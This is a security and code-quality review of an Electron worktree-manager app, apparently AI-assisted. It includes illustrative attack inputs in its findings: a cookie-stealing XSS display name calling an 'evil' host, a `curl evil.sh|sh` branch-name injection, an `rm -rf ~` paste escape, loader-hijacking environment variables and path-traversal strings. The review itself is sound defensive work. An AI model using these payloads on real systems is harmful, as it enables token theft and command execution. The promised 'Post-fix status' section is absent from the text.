# klausify-desktop — Full-Codebase Review

> **Status (post-fix):** Batches 1 and 2 have been applied in this working tree.
> See the **Post-fix status** section at the bottom for the list of what landed,
> what remains (Batch 3 — architectural refactors), and one correction to the
> original review (the `Klaussy/` claim about gitignore was wrong — `Klaussy/`
> was NOT in `.gitignore` until these fixes added it).



**Scope:** whole `main` branch. ~35k lines across 47 tracked files. Electron desktop app: multi-terminal Claude Code worktree manager + GitHub PR reviewer.

**Method:** 4 parallel focused sub-agents (correctness/concurrency, architecture/perf/reliability, security/quality/tests, scope/conventions) — findings validated against the source before synthesis. Duplicates merged; invalid claims dropped.

---

## Overall verdict: **Request Changes**

The app is feature-rich and works. But there is a cluster of security issues — unrestricted filesystem IPC, no CSP, XSS-permitting escapers in PR render paths, shell-string command construction — that together make a single XSS escalate to full user-filesystem + GitHub-token compromise. That cluster should block "broader distribution" (per the README roadmap). Alongside the security gap: a handful of real correctness races (kill-task orphans, non-atomic `saveConfig`, LSP server leaks on window destroy), a systemic performance pattern (`execFileSync` on the main thread in hot timers and git handlers), and zero automated tests on an app that runs destructive git operations and merges PRs.

**Highest-risk issues (fix before pre-release to new users):**
1. Unrestricted `read-file` / `write-file` IPC + missing CSP → one XSS = full FS + `~/.config/gh/hosts.yml` token theft.
2. `escHtml` doesn't escape `"`/`'` and PR-picker renders `it.author` raw — latent XSS anywhere a GitHub display name / branch / title contains `"` or a script tag.
3. Shell-string `git worktree add` at `main.js:700` and `1675`, plus `shell.openExternal` with no scheme allowlist.
4. `kill-task` race spawns an orphaned untracked shell PTY on Claude tasks.
5. LSP servers never cleaned up on window destroy (`stopServersForWebContents` exported but never called).
6. Non-atomic `saveConfig` read-modify-write with 64+ callers and a 10s timer — data-loss under routine overlap.
7. Blocking `execFileSync` on the main thread in auto-fetch/CI-polling timers and most git IPC handlers — multi-second UI freezes under normal use.
8. Zero automated tests on an app that runs `git clean -f`, `gh pr merge`, and pipes AI output into PTYs.

**Test coverage assessment:**
- [ ] Adequate test coverage for changes — **no tests exist**
- [ ] Edge cases tested — N/A

---

# Findings

Ordered by severity within each category. `file:line` references validated against the current tree.

---

## Blocker / High — Security

### H-SEC-1: Unrestricted `read-file` / `write-file` IPC
**[Location: `main.js:5047-5063`]**
```js
ipcMain.handle('read-file', async (_event, { filePath }) => {
  const content = fs.readFileSync(filePath, 'utf-8');
  return { content, ext: path.extname(filePath).slice(1) };
});
ipcMain.handle('write-file', async (_event, { filePath, content }) => {
  fs.writeFileSync(filePath, content, 'utf-8');
  return { ok: true };
});
```
**Category: Security**
- Any XSS in the renderer (see H-SEC-3 for live ones) escalates to full read/write of anything the user owns: `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.config/gh/hosts.yml` (GitHub OAuth tokens in plaintext), `~/.zshrc`, etc. No path validation, no traversal guard, no root restriction. Same shape in `read-skill-file` / `write-skill-file` (`main.js:1354-1373`), `create-memory-file` (`main.js:1501-1517`), and `read-conflict-file` / `write-resolved-file` (`main.js:4739-4756`) which build `path.join(worktreePath, file)` with no check that `..` is refused.
- **Fix:** require every file path to resolve under a known root (`worktreePath`, `userData`, skill dir). `read-files-bulk` at `main.js:3746-3760` already does this correctly — copy that pattern. Also add an `fs.realpathSync` check so symlinks inside the root can't be abused to write outside (`replace-in-files` at 3842 has this on the root but not the per-file path).

---

### H-SEC-2: No Content-Security-Policy on any renderer HTML
**[Location: `renderer/index.html`, `renderer/pr-review.html`, `renderer/popout.html`, `renderer/preferences.html`]**
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Klaussy</title>
  <!-- no CSP meta tag -->
```
**Category: Security**
- `grep -l "Content-Security-Policy" renderer/*.html` returns empty. Without a CSP, any XSS can fetch remote scripts, `eval`, or inject inline handlers — making H-SEC-3 much worse. `contextIsolation: true` + `nodeIntegration: false` (good) mitigate node escape, but the full `window.klaus.*` IPC surface is still reachable, and H-SEC-1 + H-SEC-4 turn that into FS + token compromise.
- **Fix:** add to every HTML entrypoint:
  ```html
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';">
  ```
  Monaco may need `'unsafe-eval'` in `script-src` (it uses its own worker loader) — verify by launching with CSP enabled and watching the console.

---

### H-SEC-3: `escHtml` doesn't escape quotes; PR picker renders GitHub names raw
**[Location: `renderer/utils.js:2-4` + `renderer/app.js:1269-1318`]**
```js
// utils.js
function escHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
```
```js
// app.js — PR picker
recentEl.innerHTML = '<div class="pr-picker-section-head">Recently reviewed</div>'
  + items.map(function (it) {
      return '<div class="pr-picker-item" data-url="' + (it.url || '').replace(/"/g, '&quot;') + '">'
        + '<span class="pr-picker-num">#' + it.number + '</span>'
        + '<span class="pr-picker-title">' + (it.title || '').replace(/</g, '&lt;') + '</span>'
        + '<span class="pr-picker-author">' + (it.author || '') + '</span>'  // raw, unescaped
```
**Category: Security**
- Two bugs, same root cause. (a) `escHtml` doesn't escape `"` or `'`, but it's used widely inside attributes (`data-url="…"`, `title="…"`, `class="pr-decision-<escHtml(…)>"`). A GitHub display name / branch name / PR title that contains `"` breaks out of the attribute. (b) The PR picker interpolates `it.author` with no escaping at all, and `it.title` with only `<` → `&lt;` (not `>`, not `&`, not quotes). A GitHub user can set their display name to `<img src=x onerror="fetch('//evil/?c='+document.cookie)">` (GitHub allows most punctuation in display names) and the payload executes the next time any Klaussy user opens the PR picker with that PR in their recent list. Combined with H-SEC-1 + H-SEC-2, this is a complete user-filesystem compromise via a malicious PR author.
- Three files (`env-panel.js:196`, `diff-panel.js:1533`, `pr-panel.js:995`) define their own local `escAttr` — indicating the team already noticed `escHtml` was insufficient for attributes, but the consolidation never happened.
- **Fix:** extend `escHtml` in `utils.js` to also escape `"` and `'` (fine for text contexts too). Add a distinct `escAttr` export for clarity. Replace every raw-interpolation of user-sourced data in `app.js:1269-1318`, and audit every `innerHTML` site in the renderer (there are many in `pr-review.js`, `pr-panel.js`, `diff-panel.js`). Consider a tagged template (`` safeHtml`<a href="${url}">${name}</a>` ``) to make this a compile-time-ish pattern.

---

### H-SEC-4: Shell-string `git worktree add` — command injection
**[Location: `main.js:700`, `main.js:1675`]**
```js
// main.js:700 (create-task)
execSync(`git worktree add -b "${branch}" "${worktreePath}" "${baseBranch}"`, {
  cwd: repoPath, stdio: 'pipe',
});

// main.js:1675 (duplicate-task)
execSync(`git worktree add -b "${branch}" "${worktreePath}" "${sourceBranch}"`, {
  cwd: repoPath, stdio: 'pipe',
});
```
**Category: Security**
- String-interpolated shell commands. `branch` is sanitized (`/[^a-zA-Z0-9_-]/g` → `-`) so it's safe. `worktreePath` derives from `basePath || path.dirname(repoPath)` where `basePath` is a user-picked directory via `showOpenDialog`. macOS allows `"` in folder names (rare but legal). `baseBranch` / `sourceBranch` come from renderer input, validated only by `git rev-parse --verify` which permits many shell metachars (git's refname rules forbid space/`..`/`:`/`?`/`\`/`^`/`~` but not `"`/`$`/`` ` ``/`;`/`&`/`|`/`(`/`)`). Example exploit: a remote branch named `` `curl evil.sh|sh` `` (git allows backticks in refnames on the remote side). Combined with H-SEC-3 an XSS can also call `createTask({ baseBranch: 'main"; curl evil.sh|sh; "' })`.
- Every other git call in the file correctly uses `execFileSync` with an array. These two stand out.
- **Fix:**
  ```js
  execFileSync('git', ['worktree', 'add', '-b', branch, worktreePath, baseBranch], {
    cwd: repoPath, stdio: 'pipe',
  });
  ```

---

### H-SEC-5: `shell.openExternal` has no scheme allowlist
**[Location: `main.js:1203-1205`]**
```js
ipcMain.handle('open-external', (_event, { url }) => {
  shell.openExternal(url);
});
```
**Category: Security**
- Electron explicitly warns against `openExternal` with untrusted input. Callers include PR metadata (trusted from gh) but also the xterm `WebLinksAddon` in `terminal-manager.js:42-44`, which auto-detects URL-shaped substrings in the PTY output stream. A malicious `claude` response or shell output can print `file:///Users/…/.ssh/id_rsa`, `smb://attacker/share` (credential-leak on Windows; not relevant on macOS but this may go cross-platform later), or `javascript:` which on some platforms triggers the OS handler.
- **Fix:** in main, validate the protocol before forwarding:
  ```js
  const allow = new Set(['http:', 'https:', 'mailto:']);
  let u; try { u = new URL(url); } catch { return; }
  if (allow.has(u.protocol)) shell.openExternal(u.toString());
  ```
  Similarly restrict `open-skill-file` (`main.js:1348-1352`) to files under `~/.claude` or the active project root — it currently calls `shell.openPath` on any renderer-supplied path.

---

### H-SEC-6: No `setWindowOpenHandler` / `will-navigate` guards on any BrowserWindow
**[Location: `main.js:120`, `main.js:2286`, `main.js:3534`, `main.js:3603`]**
**Category: Security**
- None of the four `BrowserWindow` constructions install navigation guards. An XSS that runs `window.location = 'https://evil/'` moves the main window off `file://…/index.html` — but the preload (and thus `window.klaus.*`) stays attached to the same `webContents`, so the attacker page gets the full IPC surface. `window.open` calls are also unrestricted.
- **Fix:** after each `new BrowserWindow(...)`:
  ```js
  win.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
  win.webContents.on('will-navigate', (e, url) => {
    if (!url.startsWith('file://')) e.preventDefault();
  });
  ```
  Also consider adding `sandbox: true` to `webPreferences` — preload continues to work, renderer gets OS sandbox, and `window.klaus.*` surface is unchanged.

---

### H-SEC-7: Bracketed-paste injection from PR content
**[Location: `main.js:4390-4411`]**
```js
const BP_START = '\x1b[200~';
const BP_END = '\x1b[201~';
try {
  target.pty.write(BP_START + text + BP_END);
}
```
**Category: Security**
- `text` is a PR comment / AI finding body rendered from untrusted GitHub content (by the user clicking "Send to Claude"). Bracketed paste is not a security boundary — if `text` itself contains `\x1b[201~` (the end sequence), the shell exits paste mode and treats subsequent content as typed input. A malicious PR comment of form `\x1b[201~\nrm -rf ~\n` would execute when a user pastes it to Claude or a shell.
- **Fix:** strip/escape `\x1b[200~` and `\x1b[201~` sequences from `text` before writing (regex replace on the two specific sequences is enough). Stripping all control characters except `\n`/`\r` is safer.

---

### H-SEC-8: PTY environment accepts `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PATH`
**[Location: `main.js:933-956`]**
```js
const ptyProc = pty.spawn(userShell, args, {
  env: { ...process.env, TERM: 'xterm-256color', ...(extraEnv || {}) },
});
```
**Category: Security**
- `extraEnv` arrives from the renderer via `create-task`'s `envVars` IPC argument with no sanitization. A compromised renderer (via H-SEC-3) sets `DYLD_INSERT_LIBRARIES=/tmp/evil.dylib` or `NODE_OPTIONS=--require /tmp/evil.js` to hijack every process spawned in the PTY (including `claude`). Even benign UI paths let users shoot their own foot silently if they paste a malicious `.env` file.
- **Fix:** reject loader-hijacking env names before merging: `/^(LD_|DYLD_|PATH$|PYTHONPATH$|RUBYOPT$|PERL5LIB$|NODE_OPTIONS$)/`. Enforce env names match `^[A-Z_][A-Z0-9_]*$`.

---

### H-SEC-9: GitHub OAuth token embedded in git remote URL; persisted to `.git/config`
**[Location: `main.js:2975-3032`]**
```js
const authedUrl = `https://oauth2:${token}@github.com/${baseOwner}/${baseRepo}.git`;
execFileSync('git', ['clone', '--filter=blob:none', authedUrl, clonePath], { stdio: 'pipe' });
execFileSync('git', ['fetch', authedUrl, `+refs/pull/${number}/head:refs/heads/${localBranch}`], { cwd, stdio: 'pipe' });
```
**Category: Security**
- git writes the remote URL (with embedded token) into `clonePath/.git/config` — persists on disk forever. `ps auxww` on the same machine sees the URL during clone (token-visible to other local users). The `scrub()` function only scrubs the echoed error message, not the persisted config or `ps` listing.
- **Fix:** immediately after clone, scrub the config: `git remote set-url origin https://github.com/${baseOwner}/${baseRepo}.git`. Better: use `git -c credential.helper='!f() { echo "password=$GH_TOKEN"; }; f'` with `GH_TOKEN` as env var, or run `gh repo clone` which handles this natively.

---

### H-SEC-10: Zero automated tests on an app that does destructive git + shell ops
**[Location: repository-wide]**
**Category: Tests**
- `git ls-files | grep -iE '(test|spec)'` returns empty. No Jest/Mocha/Vitest in `devDependencies`. `scripts/pyright-repro.js` is a manual repro playground, not a test. The app runs `git worktree add`, `git clean -f`, `git checkout`, `git reset`, `gh pr merge --merge/--squash/--rebase` — any of these can destroy uncommitted work or irreversibly mutate GitHub state if a bug lands. It also pipes AI output into PTYs via bracketed paste (see H-SEC-7).
- **Fix:** before broader distribution, land focused unit coverage on the argv-builder seams (the highest-leverage preventive layer for H-SEC-4 and H-SEC-8). Priorities:
  1. Every `execFile*` argv builder — feed pathological input (`; rm -rf ~`, `../etc/passwd`, `$(touch /tmp/pwn)`) and assert the payload does not land in a shell-interpretable position.
  2. Parsers: `gh-list-accounts`, `parseGrepOutput`, `parseBaseFromUrl`, the blame porcelain parser at `main.js:2051`. Pure functions, trivial to test.
  3. Path-traversal tests for every file-IPC (H-SEC-1).
  4. Renderer `escHtml` / markdown-render snapshot tests against adversarial input.

  Add Jest + a `test` script to `package.json`. A dozen focused unit tests would catch most of the shell-injection risk.

---

## High — Correctness / Concurrency

### H-COR-1: `kill-task` spawns an orphaned untracked shell PTY on Claude tasks
**[Location: `main.js:1123-1139` + `main.js:986-1000`]**
```js
// kill-task
ipcMain.handle('kill-task', (_event, { id }) => {
  const inst = instances.get(id);
  if (!inst) return { error: 'Instance not found' };
  clearIdleTimer(inst);
  stopCIPolling(id);
  try { inst.pty.kill(); } catch {}            // async: onExit fires later
  for (const sub of (inst.subTerminals || [])) { try { sub.pty.kill(); } catch {} }
  inst.alive = false;
  instances.delete(id);                         // deletes Map entry, `inst` still referenced
  return { ok: true };
});

// ptyProc.onExit
ptyProc.onExit(({ exitCode }) => {
  clearIdleTimer(instance);
  if (instance.mode === 'claude' && !isQuitting) {
    convertInstanceToShell(instance);            // spawns a NEW shell PTY on the dead instance
    return;
  }
  ...
});
```
**Category: Correctness**
- `kill-task` calls `inst.pty.kill()` (async) then `instances.delete(id)`. `inst.mode` is never changed. When the async `onExit` fires, it sees `mode === 'claude' && !isQuitting` → spawns a new shell PTY inside the now-orphaned `inst` object. The new PTY has no Map entry, so no handler can find or kill it. It runs until it exits on its own (e.g. when the shell pipe breaks).
- **Fix:** before calling kill, mark intent:
  ```js
  inst.killed = true;
  try { inst.pty.kill(); } catch {}
  ```
  In `onExit`: `if (instance.killed) { instance.alive = false; return; }` — above the `convertInstanceToShell` branch.

---

### H-COR-2: `saveConfig` is non-atomic read-modify-write with 64+ callers
**[Location: `main.js:55-62`]**
```js
function saveConfig(config) {
  try {
    const existing = JSON.parse(fs.readFileSync(getConfigPath(), 'utf-8'));
    config = Object.assign(existing, config);
  } catch {}
  fs.writeFileSync(getConfigPath(), JSON.stringify(config, null, 2));
}
```
**Category: Concurrency / Reliability**
- Called from ~64 sites — periodic `saveSessions` (10s timer at line 339), prefs change, pr-review cache, task notes, review history, `gh-switch-account`, etc. Two overlapping calls can each read the old state, merge independently, and the second write clobbers the first's field additions. A process crash between `writeFileSync` opening and closing truncates `config.json` — the next `loadConfig` silently falls back to `{}` (line 50-52), and subsequent saves wipe every saved session, project, and review-history entry from disk.
- **Fix:** (a) write to `config.json.tmp` then `fs.renameSync` atomically (POSIX rename is atomic). (b) Serialize writes behind an in-process queue (one in flight, coalesce waiting writes). (c) Longer-term, keep `activeConfig` in memory as the source of truth and flush debounced; stop re-reading from disk on every save.

---

### H-COR-3: LSP servers leak when webContents is destroyed
**[Location: `lsp-manager.js:415-419` + `main.js` `createWindow`]**
```js
// Defined and exported, but never invoked:
function stopServersForWebContents(webContents) {
  for (const [id, entry] of servers) {
    if (entry.webContents === webContents) stopServer(id);
  }
}
```
**Category: Reliability**
- `stopServersForWebContents` is exported at `lsp-manager.js:521` but has zero call sites in the codebase (`grep -rn stopServersForWebContents main.js renderer/` returns nothing). When a window is destroyed (reload, close, crash), every LSP subprocess started by that renderer keeps running. `proc.stdout.on('data', …)` handlers still fire into `webContents.send` which silently no-ops on destroyed senders, but the child processes (pyright, rust-analyzer, clangd, etc. — some consume 500MB+) continue until the app quits. After several window reload cycles during development, the user will accumulate gigabytes of zombie language servers.
- **Fix:** in `createWindow` (and for popouts at `main.js:2286`, `3534`, `3603`):
  ```js
  win.webContents.on('destroyed', () => lspManager.stopServersForWebContents(win.webContents));
  ```

---

### H-COR-4: `restart-task` races between old-PTY `onExit` and new-PTY spawn
**[Location: `main.js:1142-1200`]**
```js
ipcMain.handle('restart-task', (_event, { id, cols, rows }) => {
  const inst = instances.get(id);
  ...
  try { inst.pty.kill(); } catch {}   // async
  ...
  inst.mode = 'claude';                // set BEFORE onExit fires
  ...
  const ptyProc = pty.spawn(userShell, args, {...});
  inst.pty = ptyProc;
});
```
**Category: Concurrency**
- `pty.kill()` is async. Between lines 1148 and 1171, the stale `onExit` handler from the old PTY can fire. With `inst.mode === 'claude'` (set at line 1157), that handler branches to `convertInstanceToShell(inst)` → spawns a shell PTY at line 1013 and replaces `inst.pty` with it. Then the restart path's spawn at 1163 overwrites `inst.pty` again — the shell PTY is orphaned but its `onData` handler is still wired to `terminal-data-${id}`, so the renderer receives mixed shell/claude output until the shell exits.
- **Fix:** same pattern as H-COR-1 — set `inst.restarting = true` before `kill()`; check in the old-PTY `onExit` to skip the convert branch.

---

### H-COR-5: Saved-session dismiss uses stale captured index → deletes wrong session
**[Location: `renderer/app.js:610-620`]**
```js
item.querySelector('.saved-session-dismiss').addEventListener('click', function (e) {
  e.stopPropagation();
  item.remove();
  sessions.splice(idx, 1);                // idx captured from the forEach closure
  var config_sessions = sessions.filter(function () { return true; });  // dead code
  if (taskList.querySelectorAll('.saved-session').length === 0) {
    window.klaus.clearSavedSessions();
  }
});
```
**Category: Correctness**
- `idx` is the closure-captured position at render time. After the user dismisses `idx=3`, the array shifts — row originally at `idx=5` still dismisses with `splice(5)`, now a different session. Also: the only persistence is `clearSavedSessions()` when *all* are gone. Individual dismisses are lost on next startup.
- **Fix:** identify by stable key (e.g. `session.worktreePath + '#' + session.sessionId`) and `filter` rather than `splice`. Add a `dismissSavedSession(session)` IPC to persist per-item removal.

---

### H-COR-6: `git-discard` fallback to `git clean -f` destroys staged new files
**[Location: `main.js:1841-1855`]**
```js
for (const file of files) {
  try {
    execFileSync('git', ['checkout', '--', file], { cwd: worktreePath, stdio: 'pipe' });
  } catch {
    execFileSync('git', ['clean', '-f', '--', file], { cwd: worktreePath, stdio: 'pipe' });
  }
}
```
**Category: Correctness / Data-loss**
- A staged-new file (added with `git add` but never committed) has nothing to revert to on disk, so `git checkout --` fails. The fallback `git clean -f` then deletes the file entirely — along with whatever staged content. Silent data loss from the "discard" UI action.
- **Fix:** check `git status --porcelain -- <file>` first and branch on the status code (`??` → clean; staged → `git reset HEAD -- <file>` + `checkout`; unstaged → checkout). Or just don't fall back to `clean` for files that show as staged.

---

## High — Architecture / Performance

### H-PERF-1: Blocking `execFileSync` on the main thread in background timers and git handlers
**[Location: `main.js:339-343`, `4933-4956`, `4804-4820`, and ~30 `git-*` IPC handlers at `main.js:1690-2100`]**
```js
// 10-second saveSessions timer
setInterval(() => {
  if (!isQuitting && instances.size > 0) { try { saveSessions(); } catch {} }
}, 10000);

// auto-fetch timer — serially fetches every worktree, sync, on the main thread
autoFetchIntervalId = setInterval(() => {
  for (const [id, inst] of instances) {
    ...
    execFileSync('git', ['fetch', '--prune'], { cwd: inst.worktreePath, stdio: 'pipe', timeout: 10000 });
    ...
  }
}, interval);

// CI polling — sync gh call per task, every 30s
ciPollingIntervals.set(id, setInterval(poll, 30000));  // poll uses execFileSync('gh', ...)
```
**Category: Performance / Reliability**
- ~30 git handlers (`git-status`, `git-diff`, `git-blame`, `git-log`, `git-show`, `git-push`, `git-pull`, `git-commit`, etc.) call `execFileSync` on the Electron main thread. `git blame` on a 5k-line file, a slow `git push`, or a `gh run list` on flaky network all freeze *every window* — clicks, menus, even PTY data fan-out queue up behind the sync call. With N tasks, the auto-fetch and CI-polling timers can block the main thread for up to `10s × N` per tick. `collectWorktreeState` at 1923-1968 already uses the async pattern — copy it.
- **Fix:**
  ```js
  const execFileP = util.promisify(execFile);
  ipcMain.handle('git-status', async (_e, { worktreePath }) => {
    try {
      const { stdout } = await execFileP('git', ['status', '--porcelain'], { cwd: worktreePath });
      ...
    } catch (err) { return { error: ... }; }
  });
  ```
  For the background timers: `Promise.all(...)` with a small concurrency cap (4 in flight). Group auto-fetch by unique remote URL — fetch once per remote, not once per worktree of the same remote.

---

### H-ARCH-1: `main.js` at 5063 lines is mixing ~15 unrelated responsibilities
**[Location: `main.js:1-5063`]**
**Category: Design**
- One file bundles: Electron bootstrap, menu, session persistence, PTY lifecycle, idle detection, every IPC handler for git/gh/PR/LSP/file-viewer/search/env/conflicts/CI/tags/notes/AI-streaming/PR-review/auto-fetch/worktree-watcher, plus a 375-line prompt template inline (`PR_REVIEW_TEMPLATE` at 3965-4340) and 8 near-identical streaming-AI handlers. Any two of these can touch shared state (`instances`, `activePrReview`, `logBuffer`, `ghTokenCache`) without noticing.
- **Fix:** split along clear seams: `main/ipc/git.js`, `main/ipc/pr.js`, `main/ipc/lsp.js`, `main/ipc/ai-streaming.js`, `main/ipc/files.js`, `main/services/gh.js` (`ghExec`/`ghJson`/`ghText`/`ghEnvForRepo`), `main/services/claude.js` (the `spawn(claudeBin, ['-p', prompt], …)` streaming helper below), `main/state/` for session/PR/review-cache stores, `main/prompts/pr-review.md` for the template. Target <500 LOC/file.

---

### H-ARCH-2: 8 near-identical Claude-streaming IPC handlers — 300+ lines of copy-paste
**[Location: `main.js:2665-2758`, `2773-2826`, `2832-2885`, `3103-3162`, `3169-3237`, `3911-3961`, `4413-4475`]**
```js
// Same shape 7 times, with drift:
//   debugCheckProcs / inlineEditProcs / inlineCompleteProcs /
//   reviewSurfaceAiProcs / implementProcs / aiReviewProcs / explainStreamProcs
// Each: Map<requestId, ChildProcess> + spawn + onData + onError + onExit + cancel
```
**Category: Design / Correctness**
- The 8 handlers drift: `pr-debug-check-start` returns `{ error }` on spawn error *before* registering cleanup; `pr-ai-review-start`'s exit handler checks `sender.isDestroyed()` after some branches but not others; `const { spawn } = require('child_process')` is re-required inside each. None of them kill the subprocess when the renderer's `webContents` is destroyed mid-stream — a closed PR-review popout leaves a `claude -p` running until it exits naturally, consuming Anthropic quota invisibly.
- **Fix:** extract
  ```js
  function spawnClaudeStream({ requestId, cwd, args, sender, channelPrefix, onDone }) { ... }
  ```
  Each feature shrinks to ~15 lines. Add `sender.once('destroyed', () => { try { proc.kill('SIGTERM'); } catch {} })` once inside the helper.

---

### H-ARCH-3: Two PR review caches running in parallel
**[Location: `main.js:4346-4386` + `main.js:3242-3277`]**
```js
// Cache A: inside config.json under config.prReviews[repo#n]  (G1-series)
ipcMain.handle('pr-review-cache-get',      ...)
ipcMain.handle('pr-review-cache-save',     ...)
// Cache B: one JSON file per PR in userData/pr-review-cache/  (G7-series)
ipcMain.handle('pr-review-cache-get-by-pr',   ...)
ipcMain.handle('pr-review-cache-save-by-pr',  ...)
```
**Category: Design**
- Both caches are live. Preload exposes both. Renderer code calls both. A review saved via one path won't show up from the other. Over time these silently diverge — the user sees an old cached review where a newer one exists, or vice versa.
- **Fix:** pick one (file-per-PR is the better shape — no unbounded growth, no contention). On startup, migrate: read `config.prReviews`, write each entry out as a file, delete `config.prReviews`. Retire the old handlers.

---

## Medium

### M-SEC-1: Path traversal via unsanitized relative paths in multiple file IPCs
**[Location: `main.js:1354-1373` (read-skill-file), `main.js:1501-1517` (create-memory-file), `main.js:4739-4756` (read-conflict-file/write-resolved-file), `main.js:3746-3760` (read-files-bulk — symlink gap)]**
- `path.join(worktreePath, '../../etc/passwd')` resolves outside the worktree without any check. `read-files-bulk` checks `abs.startsWith(path.resolve(worktreePath) + path.sep)` but doesn't `fs.realpathSync` the file — a symlink `worktree/foo` → `/etc/passwd` passes and reads the target.
- **Fix:** centralize a `pathUnder(root, rel)` helper that rejects traversal AND verifies `fs.realpathSync(abs)` stays under `fs.realpathSync(root)`. Use everywhere.

### M-SEC-2: `git grep` missing `--` separator
**[Location: `main.js:3803`]**
```js
const args = ['grep', '-n', '--no-color', '-I', '-r', '-F', cap, query];
```
- If `query` starts with a git-grep recognized flag (`--cached`, `--function-context`, etc.), `-F` doesn't fully protect because argv parsers vary. Low practical exploit surface but trivial to harden.
- **Fix:** `args.push('--', query)` — or better, insert `'--'` before `query`.

### M-SEC-3: `ghTokenCache` never invalidated
**[Location: `main.js:42`, `72-108`]**
- Tokens cached forever keyed by owner. After `gh auth switch` or `gh auth refresh` (outside the app or via the `gh-switch-account` handler at `main.js:1599-1607`), the cache holds a stale/revoked token and every `ghEnvForRepo` hands it out.
- **Fix:** clear `ghTokenCache` in the `gh-switch-account` handler. Add a 5-minute TTL. On 401 from a `gh` call, evict and retry once.

### M-SEC-4: Log ring buffer doesn't scrub tokens
**[Location: `main.js:14-29`]**
- `console.*` is monkey-patched into `logBuffer`. When git/gh errors echo URLs like `https://oauth2:ghp_xxx@github.com/...` (which happens on clone/fetch failures before any scrub), the token lands in `logBuffer` and is exposed via the `get-logs` IPC to every renderer including a potentially-XSS'd one.
- **Fix:** inside `captureLog`, scrub `oauth2:[^@]+@`, `ghp_[A-Za-z0-9]{36}`, `gho_*`, `ghs_*`, `ghu_*`, `Bearer [A-Za-z0-9_\-]+` patterns before storing.

### M-SEC-5: `write-transcript` accepts arbitrary path
**[Location: `main.js:2130-2138`]**
- Intended to be called only after `showSaveDialog`, but nothing prevents a compromised renderer from calling `writeTranscript({ filePath: '/etc/hosts', content: 'malicious' })`. On unsandboxed environments this overwrites anything the user owns.
- **Fix:** hold the dialog-selected path main-side; expose a single IPC `saveTranscript(content)` that runs dialog + write together.

### M-SEC-6: `disable-library-validation` entitlement is broader than needed
**[Location: `build/entitlements.mac.plist:11-13`]**
- Combined with `hardenedRuntime: false` in `package.json:67`, the app has no runtime library-integrity protection. Once signing is enabled, try signing `node-pty`'s native binding with the Developer ID and dropping this entitlement.

---

### M-COR-1: `fetchThreadsForActive` has no re-entry guard
**[Location: `main.js:2565-2568` and fetchThreadsForActive impl]**
- Overlapping refresh calls can arrive out-of-order; the penultimate GraphQL response can overwrite `activePrReview.threads` after the latest one has landed, showing stale threads.
- **Fix:** carry an in-flight epoch token; bail if stale on return.

### M-COR-2: Claude session ID detection uses unstable `ctime` sort
**[Location: `main.js:457-464`]**
- Fast-spawned sessions can share identical sub-second `ctime` on APFS — the sort is unstable, and two instances can swap session IDs on resume.
- **Fix:** use `ctimeNs` (nanosecond precision via `fs.stat` with `bigint: true`) or match by session-start timestamp inside the `.jsonl`.

### M-COR-3: `pr-checkout-locally` broadcast causes duplicate UI in secondary windows
**[Location: `main.js:3062-3095`]**
- Event sent to every window; `addTaskToUI` in each window doesn't check `tasks.has(id)` first, so secondary windows build duplicate containers for the same task.
- **Fix:** make `addTaskToUI` idempotent, or target the broadcast at the originating window.

### M-COR-4: Multi-window `saveUIState` clobbers
**[Location: `renderer/app.js:125-131`]**
- Every window saves its own UI state (diff panel visibility, selected file) into the shared `config.uiState` every 10s. Whichever tick happens last wins; across windows this is random.
- **Fix:** only save from the main window, or key UI state by window id.

### M-COR-5: `fs.watch` recursive scalability + no fallback signal
**[Location: `main.js:4979-4992`]**
- One recursive watch per active worktree. macOS has a process-wide FSEvents budget (~4096 paths). `fs.watch` errors only `console.log`, never surface to the UI — the user silently loses the diff panel's auto-refresh.
- **Fix:** surface watcher errors to the renderer so it can fall back to polling. Consider sharing one watcher across worktrees under a common parent.

### M-COR-6: Non-virtualized file tree + filter re-render on every keystroke
**[Location: `renderer/file-browser.js:754-816`]**
- `renderTreeNode` appends one DOM node per path (cap 10k). The filter input rebuilds the whole tree synchronously on each `input` event.
- **Fix:** virtualize the list; debounce the filter 100-150ms; build directory children lazily on expansion.

### M-COR-7: Two divergent markdown renderers in renderer code
**[Location: `renderer/pr-review.js:1025-1040` vs `renderer/pr-panel.js:901-911`]**
- The two implementations handle fenced code blocks differently; only one is correct (the pr-panel version double-escapes `<` inside code blocks).
- **Fix:** consolidate into `utils.js` or a new `renderer/markdown.js`.

### M-COR-8: AI review streams interleave on double-click re-run
**[Location: `renderer/pr-panel.js:672-817`]**
- `runAiReview` can be re-entered via the "Re-run" button in `renderCompletedReview` without cancelling the in-flight request. Two streams write into `bodyEl` concurrently.
- **Fix:** at entry, if `currentAiReviewId`, call `prAiReviewCancel(currentAiReviewId)` and unsubscribe before starting the new one.

### M-COR-9: GitHub Enterprise hardcoded-out via `github.com` regex
**[Location: `main.js:2399-2404` + similar sites]**
- `parseBaseFromUrl` and origin-URL detection use `github\.com` literally. Users on GHE can't review PRs, list branches, or use gh-auth.
- **Fix:** derive `nameWithOwner` via `gh repo view --json nameWithOwner` rather than regexing; broaden hostname matching.

### M-COR-10: `detectClaudeSessionId` orphans on symlinked/shared worktree paths
**[Location: `renderer/lsp-client.js:453-481`]**
- `pendingFlushes.set(uri, sendChangeNow)` overwrites across sessions when the same URI appears under two worktrees (monorepo/symlink cases), so a `didSave` from session A flushes using session B's closure.
- **Fix:** key `pendingFlushes` by `(session, uri)` tuple.

### M-COR-11: `read-files-bulk` + `replace-in-files` don't follow-through symlinks correctly
**[Location: `main.js:3746-3760`, `main.js:3846-3877`]**
- `replace-in-files` `realpathSync`s the worktree root but not the file — symlinks inside the worktree can point out. `read-files-bulk` does neither.
- **Fix:** after resolving each path, `fs.realpathSync` and re-check under the root, or open with `fs.openSync(..., 'r'|'w')` + `lstat` to refuse symlinks.

### M-COR-12: `pr-review-checks` misreports "no checks" as an error when one API returns empty + one fails
**[Location: `main.js:2594-2620`]**
- The guard `checks.length === 0 && (runsRes.err || statusRes.err)` treats a legitimate empty-checks response as an error if the *other* call happened to fail.
- **Fix:** require `runsRes.err && statusRes.err` before returning error.

